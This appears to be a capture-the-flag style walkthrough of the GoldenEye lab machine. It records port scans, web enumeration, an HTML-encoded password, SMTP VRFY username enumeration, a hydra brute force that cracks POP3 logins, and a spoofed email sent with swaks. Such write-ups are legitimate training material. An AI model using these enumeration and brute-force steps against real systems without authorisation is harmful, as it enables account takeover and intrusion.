# Ports Scan & Enumeration
## Ports Scan
- smtp could retrive mail, and enumerate username.
```bash
└╼cn$ nmap -Pn -p25,53,80 -A 192.168.20.7
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-28 20:46 CST
Nmap scan report for 192.168.20.7
Host is up (0.0014s latency).

PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN,
| ssl-cert: Subject: commonName=ubuntu
| Not valid before: 2018-04-24T03:22:34
|_Not valid after:  2028-04-21T03:22:34
|_ssl-date: TLS randomness does not represent time
53/tcp open  domain?
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: GoldenEye Primary Admin Server

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 29.45 seconds
```

## Web Enum
### nikto
- what is Cobalt Qube 3 admin
```bash
└╼cn$ nikto -host 192.168.20.7
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.20.7
+ Target Hostname:    192.168.20.7
+ Target Port:        80
+ Start Time:         2021-04-28 20:48:23 (GMT8)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ Server leaks inodes via ETags, header found with file /, fields: 0xfc 0x56aba821be9ed
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ Retrieved x-powered-by header: PHP/5.5.9-1ubuntu4.24
+ /splashAdmin.php: Cobalt Qube 3 admin is running. This may have multiple security problems as described by www.scan-associates.net. These could not be tested remotely.
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 9 item(s) reported on remote host
+ End Time:           2021-04-28 20:48:44 (GMT8) (21 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

### gobuster
```bash
└╼cn$ gobuster dir -u http://192.168.20.7 -w /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x txt,htm,html,php,asp,aspx,jsp
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.20.7
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /opt/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,asp,aspx,jsp,txt,htm,html
[+] Timeout:                 10s
===============================================================
2021/04/28 20:50:28 Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 252]
/server-status        (Status: 403) [Size: 292]

===============================================================
2021/04/28 21:00:00 Finished
===============================================================
```

# Web Service
- This is a very cool web page
- do I really want to check /sev-home/? 
![](Pasted%20image%2020210428205307.png)
- I prefer to check source page first
![](Pasted%20image%2020210428205500.png)
- Seems like all the cool stuff is from the terminal.js?
![](Pasted%20image%2020210428205612.png)
- possible username `boris` and his password, along with another username `natalya`
- encoded here, looks like url encode?:
`&#73;&#110;&#118;&#105;&#110;&#99;&#105;&#98;&#108;&#101;&#72;&#97;&#99;&#107;&#51;&#114;`
- Nope, it's HTML code not url, but anyway, here's the password: `InvincibleHack3r`

## /sev-home/
- this folder give us a login page directly, so this should be boris? Yes
- After we login, there's another page
![](Pasted%20image%2020210428210228.png)
- So we have to email to GNO to get further training, and there's a non-default pop3 port in very high range port
- Check the source code fo /sev-home/, there's very nasty tricky information hidden at the very bottom of the page, if you don't scroll page to the bottom, it's in very high chance that you will miss the message:
`Qualified GoldenEye Network Operator Supervisors: 
Natalya
Boris`
![](Pasted%20image%2020210428210537.png)

- First we need to find the port, but don't know why nmap scan this box with ports range super super slow, only scan one or two ports is normal speed, so I have to scan it one by one.......until I actually got the open port.
```bash
└╼cn$ for ((i=65535; i>30000; i--)); do nmap -Pn -p $i --max-retries 0 192.168.20.7; done | grep open
...[snip]...
55007/tcp open  unknown
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
55006/tcp open  unknown
...[snip]...
```
- Now we have the ports, 55006 and 55007. Confirm again, then detail scan.
```bash
└╼cn$ nmap -Pn -v -p55000-55010 --max-retries 0 192.168.20.7
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 10:06 CST
Initiating Parallel DNS resolution of 1 host. at 10:06
Completed Parallel DNS resolution of 1 host. at 10:06, 1.17s elapsed
Initiating Connect Scan at 10:06
Scanning 192.168.20.7 [11 ports]
Discovered open port 55006/tcp on 192.168.20.7
Discovered open port 55007/tcp on 192.168.20.7
Completed Connect Scan at 10:06, 11.01s elapsed (11 total ports)
Nmap scan report for 192.168.20.7
Host is up (1.7s latency).

PORT      STATE  SERVICE
55000/tcp closed unknown
55001/tcp closed unknown
55002/tcp closed unknown
55003/tcp closed unknown
55004/tcp closed unknown
55005/tcp closed unknown
55006/tcp open   unknown
55007/tcp open   unknown
55008/tcp closed unknown
55009/tcp closed unknown
55010/tcp closed unknown

Read data files from: /usr/local/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 12.27 seconds

└╼cn$ nmap -Pn -p55006,55007 -A 192.168.20.7                                             
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-03 10:10 CST
Nmap scan report for 192.168.20.7
Host is up (0.0014s latency).

PORT      STATE SERVICE  VERSION
55006/tcp open  ssl/pop3 Dovecot pop3d
|_pop3-capabilities: PIPELINING TOP UIDL CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time
55007/tcp open  pop3     Dovecot pop3d
|_pop3-capabilities: TOP UIDL SASL(PLAIN) PIPELINING STLS CAPA USER RESP-CODES AUTH-RESP-CODE
| ssl-cert: Subject: commonName=localhost/organizationName=Dovecot mail server
| Not valid before: 2018-04-24T03:23:52
|_Not valid after:  2028-04-23T03:23:52
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.24 seconds
```


## SplashAdmin
- From [../GlasgowSmile/GlasgowSmile](../GlasgowSmile/GlasgowSmile.md) we know from nikto there's a page called `/splashAdmin.php`, but we didn't explore it yet.
![](Pasted%20image%2020210503103751.png)
```bash
└╼cn$ curl -s http://192.168.20.7/splashAdmin.php | html2text
***** Cobalt Qube 3 has been decommissioned *****

**** We can use this page to put up team photos, discussion, etc. Natalya is
not allowed to post here though --Boris ****


===============================================================================
Here's me with my new sniper rifle.


[sniper.png]
===============================================================================
Boris why are you wearing shorts in that photo? You do realize you're stationed
above the Arctic circle, correct?

BTW your favorite pen broke, but I replaced it with a new special one.

Natalya "best coder" S.
===============================================================================
"License to Kill - Complex Grenade Launchers - No Oddjob" - Unknown"
===============================================================================
Greetings ya'll! GoldenEye Admin here.

For programming I highly prefer the Alternative to GCC, which FreeBSD uses.
It's more verbose when compiling, throwing warnings and such - this can easily
be turned off with a proper flag. I've replaced GCC with this throughout the
GolenEye systems.

Boris, no arguing about this, GCC has been removed and that's final!

Also why have you been chatting with Xenia in private Boris? She's a new
contractor that you've never met before? Are you sure you've never worked
together...?

-Admin
===============================================================================
Janus was here
===============================================================================
```
- so we might have more possbile username: admin, Xenia and Janus.
- gcc is not on this system, replaced by alternative.
- use port 25 VRFY to confirm usernames
```bash
└╼cn$ smtp-user-enum -m VRFY -U users 192.168.20.7 25
Connecting to 192.168.20.7 25 ...
220 ubuntu GoldentEye SMTP Electronic-Mail agent
250 ubuntu
Start enumerating users with VRFY mode ...
[----] boris   252 2.0.0 boris
[----] natalya 252 2.0.0 natalya
[----] admin   550 5.1.1 <admin>: Recipient address rejected: User unknown in local recipient table
[----] xenia   550 5.1.1 <xenia>: Recipient address rejected: User unknown in local recipient table
[----] janus   550 5.1.1 <janus>: Recipient address rejected: User unknown in local recipient table
```

# POP3(s) Dovecot
## pop3
- The web pages [10 - Web Service](10%20-%20Web%20Service.md) only mention about pop3, so that's it. But I tried all user names with the password invinciablehacker, not work......
```bash
└╼cn$ nc -v 192.168.20.7 55007
Connection to 192.168.20.7 port 55007 [tcp/*] succeeded!
+OK GoldenEye POP3 Electronic-Mail System
USER boris
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER natalya
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER admin
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER xenia
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER janus
+OK
PASS InvincibleHack3r
-ERR [AUTH] Authentication failed.
USER admin
+OK
PASS admin
-ERR [AUTH] Authentication failed.
USER admin
+OK
PASS p@ssword
-ERR [AUTH] Authentication failed.
^C
```

## pop3s
### sslyze
```bash
└╼cn$ python3 -m sslyze 192.168.20.7:55006

 CHECKING HOST(S) AVAILABILITY
 -----------------------------

   192.168.20.7:55006                     => 192.168.20.7




 SCAN RESULTS FOR 192.168.20.7:55006 - 192.168.20.7
 --------------------------------------------------

 * OpenSSL Heartbleed:
                                          OK - Not vulnerable to Heartbleed

 * Certificates Information:
       Hostname sent for SNI:             192.168.20.7
       Number of certificates detected:   1


     Certificate #0 ( _RSAPublicKey )
       SHA1 Fingerprint:                  9d6a92eb5f9fe9ba6cbddc9355fa5754219b0b77
       Common Name:                       localhost
       Issuer:                            localhost
       Serial Number:                     16593442279642505854
       Not Before:                        2018-04-24
       Not After:                         2028-04-23
       Public Key Algorithm:              _RSAPublicKey
       Signature Algorithm:               sha256
       Key Size:                          2048
       Exponent:                          65537
       DNS Subject Alternative Names:     []

     Certificate #0 - Trust
       Hostname Validation:               FAILED - Certificate does NOT match server hostname
       Android CA Store (9.0.0_r9):       FAILED - Certificate is NOT Trusted: self signed certificate
       Apple CA Store (iOS 14, iPadOS 14, macOS 11, watchOS 7, and tvOS 14):FAILED - Certificate is NOT Trusted: self signed certificate
       Java CA Store (jdk-13.0.2):        FAILED - Certificate is NOT Trusted: self signed certificate
       Mozilla CA Store (2021-01-24):     FAILED - Certificate is NOT Trusted: self signed certificate
       Windows CA Store (2021-02-08):     FAILED - Certificate is NOT Trusted: self signed certificate
       Symantec 2018 Deprecation:         ERROR - Could not build verified chain (certificate untrusted?)
       Received Chain:                    localhost
       Verified Chain:                    ERROR - Could not build verified chain (certificate untrusted?)
       Received Chain Contains Anchor:    ERROR - Could not build verified chain (certificate untrusted?)
       Received Chain Order:              OK - Order is valid
       Verified Chain contains SHA1:      ERROR - Could not build verified chain (certificate untrusted?)

     Certificate #0 - Extensions
       OCSP Must-Staple:                  NOT SUPPORTED - Extension not found
       Certificate Transparency:          NOT SUPPORTED - Extension not found

     Certificate #0 - OCSP Stapling
                                          NOT SUPPORTED - Server did not send back an OCSP response

 * TLS 1.3 Cipher Suites:
     Attempted to connect using 5 cipher suites; the server rejected all cipher suites.

 * ROBOT Attack:
                                          OK - Not vulnerable.

 * Session Renegotiation:
       Client Renegotiation DoS Attack:   OK - Not vulnerable
       Secure Renegotiation:              OK - Supported

 * Deflate Compression:
                                          OK - Compression disabled

 * TLS 1.0 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 18 cipher suites:
        TLS_RSA_WITH_SEED_CBC_SHA                         128
        TLS_RSA_WITH_RC4_128_SHA                          128
        TLS_RSA_WITH_RC4_128_MD5                          128
        TLS_RSA_WITH_CAMELLIA_256_CBC_SHA                 256
        TLS_RSA_WITH_CAMELLIA_128_CBC_SHA                 128
        TLS_RSA_WITH_AES_256_CBC_SHA                      256
        TLS_RSA_WITH_AES_128_CBC_SHA                      128
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168
        TLS_ECDHE_RSA_WITH_RC4_128_SHA                    128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: secp384r1 (384 bits)
        TLS_DHE_RSA_WITH_SEED_CBC_SHA                     128       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA             256       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA             128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA                  128       DH (1024 bits)
        TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA                 168       DH (1024 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               INSECURE - Supported


 * SSL 3.0 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 18 cipher suites:
        TLS_RSA_WITH_SEED_CBC_SHA                         128
        TLS_RSA_WITH_RC4_128_SHA                          128
        TLS_RSA_WITH_RC4_128_MD5                          128
        TLS_RSA_WITH_CAMELLIA_256_CBC_SHA                 256
        TLS_RSA_WITH_CAMELLIA_128_CBC_SHA                 128
        TLS_RSA_WITH_AES_256_CBC_SHA                      256
        TLS_RSA_WITH_AES_128_CBC_SHA                      128
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168
        TLS_ECDHE_RSA_WITH_RC4_128_SHA                    128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: secp384r1 (384 bits)
        TLS_DHE_RSA_WITH_SEED_CBC_SHA                     128       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA             256       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA             128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA                  128       DH (1024 bits)
        TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA                 168       DH (1024 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               INSECURE - Supported


 * OpenSSL CCS Injection:
                                          OK - Not vulnerable to OpenSSL CCS injection

 * Elliptic Curve Key Exchange:
       Supported curves:                  secp384r1
       Rejected curves:                   X25519, X448, prime192v1, prime256v1, secp160k1, secp160r1, secp160r2, secp192k1, secp224k1, secp224r1, secp256k1, secp521r1, sect163k1, sect163r1, sect163r2, sect193r1, sect193r2, sect233k1, sect233r1, sect239k1, sect283k1, sect283r1, sect409k1, sect409r1, sect571k1, sect571r1

 * SSL 2.0 Cipher Suites:
     Attempted to connect using 7 cipher suites; the server rejected all cipher suites.

 * TLS 1.2 Session Resumption Support:
      With Session IDs: NOT SUPPORTED (0 successful resumptions out of 5 attempts).
      With TLS Tickets: NOT SUPPORTED - Server returned a TLS ticket but then ignored it.

 * TLS 1.2 Cipher Suites:
     Attempted to connect using 156 cipher suites.

     The server accepted the following 30 cipher suites:
        TLS_RSA_WITH_SEED_CBC_SHA                         128
        TLS_RSA_WITH_RC4_128_SHA                          128
        TLS_RSA_WITH_RC4_128_MD5                          128
        TLS_RSA_WITH_CAMELLIA_256_CBC_SHA                 256
        TLS_RSA_WITH_CAMELLIA_128_CBC_SHA                 128
        TLS_RSA_WITH_AES_256_GCM_SHA384                   256
        TLS_RSA_WITH_AES_256_CBC_SHA256                   256
        TLS_RSA_WITH_AES_256_CBC_SHA                      256
        TLS_RSA_WITH_AES_128_GCM_SHA256                   128
        TLS_RSA_WITH_AES_128_CBC_SHA256                   128
        TLS_RSA_WITH_AES_128_CBC_SHA                      128
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168
        TLS_ECDHE_RSA_WITH_RC4_128_SHA                    128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384             256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384             256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256             128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256             128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: secp384r1 (384 bits)
        TLS_DHE_RSA_WITH_SEED_CBC_SHA                     128       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA             256       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA             128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_GCM_SHA384               256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_CBC_SHA256               256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_GCM_SHA256               128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA256               128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA                  128       DH (1024 bits)
        TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA                 168       DH (1024 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               INSECURE - Supported


 * TLS 1.1 Cipher Suites:
     Attempted to connect using 80 cipher suites.

     The server accepted the following 18 cipher suites:
        TLS_RSA_WITH_SEED_CBC_SHA                         128
        TLS_RSA_WITH_RC4_128_SHA                          128
        TLS_RSA_WITH_RC4_128_MD5                          128
        TLS_RSA_WITH_CAMELLIA_256_CBC_SHA                 256
        TLS_RSA_WITH_CAMELLIA_128_CBC_SHA                 128
        TLS_RSA_WITH_AES_256_CBC_SHA                      256
        TLS_RSA_WITH_AES_128_CBC_SHA                      128
        TLS_RSA_WITH_3DES_EDE_CBC_SHA                     168
        TLS_ECDHE_RSA_WITH_RC4_128_SHA                    128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA                256       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA                128       ECDH: secp384r1 (384 bits)
        TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA               168       ECDH: secp384r1 (384 bits)
        TLS_DHE_RSA_WITH_SEED_CBC_SHA                     128       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_256_CBC_SHA             256       DH (1024 bits)
        TLS_DHE_RSA_WITH_CAMELLIA_128_CBC_SHA             128       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_256_CBC_SHA                  256       DH (1024 bits)
        TLS_DHE_RSA_WITH_AES_128_CBC_SHA                  128       DH (1024 bits)
        TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA                 168       DH (1024 bits)

     The group of cipher suites supported by the server has the following properties:
       Forward Secrecy                    OK - Supported
       Legacy RC4 Algorithm               INSECURE - Supported


 * Downgrade Attacks:
       TLS_FALLBACK_SCSV:                 VULNERABLE - Signaling cipher suite not supported


 SCAN COMPLETED IN 22.48 S
 -------------------------
```


### sslscan
```bash
└╼cn$ sslscan 192.168.20.7:55006
Version: 2.0.9-static
OpenSSL 1.1.1k  25 Mar 2021

Connected to 192.168.20.7

Testing SSL server 192.168.20.7 on port 55006 using SNI name 192.168.20.7

  SSL/TLS Protocols:
SSLv2     disabled
SSLv3     enabled
TLSv1.0   enabled
TLSv1.1   enabled
TLSv1.2   enabled
TLSv1.3   disabled

  TLS Fallback SCSV:
Server does not support TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
OpenSSL version does not support compression
Rebuild with zlib1g-dev package for zlib support

  Heartbleed:
TLSv1.2 not vulnerable to heartbleed
TLSv1.1 not vulnerable to heartbleed
TLSv1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-384 DHE 384
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-GCM-SHA384     DHE 1024 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-384 DHE 384
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-GCM-SHA256     DHE 1024 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA384       Curve P-384 DHE 384
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA256         DHE 1024 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA256       Curve P-384 DHE 384
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA256         DHE 1024 bits
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-384 DHE 384
Accepted  TLSv1.2  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.2  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-384 DHE 384
Accepted  TLSv1.2  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-SEED-SHA              DHE 1024 bits
Accepted  TLSv1.2  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256
Accepted  TLSv1.2  256 bits  AES256-SHA256
Accepted  TLSv1.2  128 bits  AES128-SHA256
Accepted  TLSv1.2  256 bits  AES256-SHA
Accepted  TLSv1.2  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.2  128 bits  AES128-SHA
Accepted  TLSv1.2  128 bits  SEED-SHA
Accepted  TLSv1.2  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.2  128 bits  TLS_RSA_WITH_RC4_128_MD5
Accepted  TLSv1.2  128 bits  TLS_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.2  112 bits  TLS_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.2  112 bits  TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.2  128 bits  TLS_ECDHE_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.2  112 bits  TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
Preferred TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-384 DHE 384
Accepted  TLSv1.1  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.1  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-384 DHE 384
Accepted  TLSv1.1  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-SEED-SHA              DHE 1024 bits
Accepted  TLSv1.1  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.1  256 bits  AES256-SHA
Accepted  TLSv1.1  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.1  128 bits  AES128-SHA
Accepted  TLSv1.1  128 bits  SEED-SHA
Accepted  TLSv1.1  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.1  128 bits  TLS_RSA_WITH_RC4_128_MD5
Accepted  TLSv1.1  128 bits  TLS_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.1  112 bits  TLS_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.1  112 bits  TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.1  128 bits  TLS_ECDHE_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.1  112 bits  TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA
Preferred TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-384 DHE 384
Accepted  TLSv1.0  256 bits  DHE-RSA-AES256-SHA            DHE 1024 bits
Accepted  TLSv1.0  256 bits  DHE-RSA-CAMELLIA256-SHA       DHE 1024 bits
Accepted  TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-384 DHE 384
Accepted  TLSv1.0  128 bits  DHE-RSA-AES128-SHA            DHE 1024 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-SEED-SHA              DHE 1024 bits
Accepted  TLSv1.0  128 bits  DHE-RSA-CAMELLIA128-SHA       DHE 1024 bits
Accepted  TLSv1.0  256 bits  AES256-SHA
Accepted  TLSv1.0  256 bits  CAMELLIA256-SHA
Accepted  TLSv1.0  128 bits  AES128-SHA
Accepted  TLSv1.0  128 bits  SEED-SHA
Accepted  TLSv1.0  128 bits  CAMELLIA128-SHA
Accepted  TLSv1.0  128 bits  TLS_RSA_WITH_RC4_128_MD5
Accepted  TLSv1.0  128 bits  TLS_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.0  112 bits  TLS_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.0  112 bits  TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
Accepted  TLSv1.0  128 bits  TLS_ECDHE_RSA_WITH_RC4_128_SHA
Accepted  TLSv1.0  112 bits  TLS_ECDHE_RSA_WITH_3DES_EDE_CBC_SHA

  Server Key Exchange Group(s):
TLSv1.2  192 bits  secp384r1 (NIST P-384)

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  localhost
Issuer:   localhost

Not valid before: Apr 24 03:23:52 2018 GMT
Not valid after:  Apr 23 03:23:52 2028 GMT
```

- What I actually need is login credential or the actual hostname, according to [10 - Web Service](10%20-%20Web%20Service.md), hostname should be GOLDENEYE.
- Still have no clue of the mail service login, so have to try by bruteforcing.....
- Username: `Boris`
- Password: `secret1!`
- Username: `natalya`
- Password: `bird`
```bash
└╼cn$ hydra -L /tmp/users -P /opt/seclists/Passwords/fasttrack.txt pop3://192.168.20.7:55007   255 ⨯
Hydra v9.2 (c) 2021 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-05-08 13:28:39
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1110 login tries (l:5/p:222), ~70 tries per task
[DATA] attacking pop3://192.168.20.7:55007/
[STATUS] 80.00 tries/min, 80 tries in 00:01h, 1030 to do in 00:13h, 16 active
[55007][pop3] host: 192.168.20.7   login: boris   password: secret1!
[STATUS] 85.00 tries/min, 255 tries in 00:03h, 855 to do in 00:11h, 16 active
[55007][pop3] host: 192.168.20.7   login: natalya   password: bird
```

- Now we have the credential. Can send mail to him. Hostname is `ubuntu`.
```bash
└╼cn$ nc -v 192.168.20.7 25
Connection to 192.168.20.7 port 25 [tcp/smtp] succeeded!
220 ubuntu GoldentEye SMTP Electronic-Mail agent
helo
501 Syntax: HELO hostname
helo goldeneye
250 ubuntu
```

- The hostname is ubuntu..... try to send a mail and see how it goes.
```bash
└╼cn$ swaks --to boris@ubuntu --from natalya@ubuntu --body 'I want the training' -s 192.168.20.7 -p 25
=== Trying 192.168.20.7:25...
=== Connected to 192.168.20.7.
<-  220 ubuntu GoldentEye SMTP Electronic-Mail agent
 -> EHLO channingnicos-macbook-pro.local
<-  250-ubuntu
<-  250-PIPELINING
<-  250-SIZE 10240000
<-  250-VRFY
<-  250-ETRN
<-  250-STARTTLS
<-  250-ENHANCEDSTATUSCODES
<-  250-8BITMIME
<-  250 DSN
 -> MAIL FROM:<natalya@ubuntu>
<-  250 2.1.0 Ok
 -> RCPT TO:<boris@ubuntu>
<-  250 2.1.5 Ok
 -> DATA
<-  354 End data with <CR><LF>.<CR><LF>
 -> Date: Sat, 08 May 2021 13:38:27 +0800
 -> To: boris@ubuntu
 -> From: natalya@ubuntu
 -> Subject: test Sat, 08 May 2021 13:38:27 +0800
 -> Message-Id: <20210508133827.002061@channingnicos-macbook-pro.local>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 ->
 -> I want the training
 ->
 ->
 -> .
<-  250 2.0.0 Ok: queued as 7EB8B42358
 -> QUIT
<-  221 2.0.0 Bye
=== Connection closed with remote host.
```

